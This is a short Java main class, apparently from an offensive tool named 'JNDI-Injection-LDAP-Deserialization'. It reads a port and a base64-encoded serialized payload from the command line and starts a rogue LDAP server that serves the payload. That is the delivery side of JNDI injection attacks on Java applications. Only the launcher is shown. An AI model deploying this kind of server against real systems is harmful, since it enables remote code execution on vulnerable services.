package com.leixiao;

import java.util.Base64;

public class Main {
    public static void main(String[] args)  {
        int port = 1389;
        byte[] serializedData = new byte[]{};
        try {
            port = Integer.parseInt(args[0]);
            serializedData = Base64.getDecoder().decode(args[1]);
        }catch (Exception e){
            System.out.println("java -jar JNDI-Injection-LDAP-Deserialization-1.0-SNAPSHOT.jar 1389 [base64Encoded_serializedData]");
            System.exit(0);
        }

        LDAPServer.start(port,serializedData);
    }
}
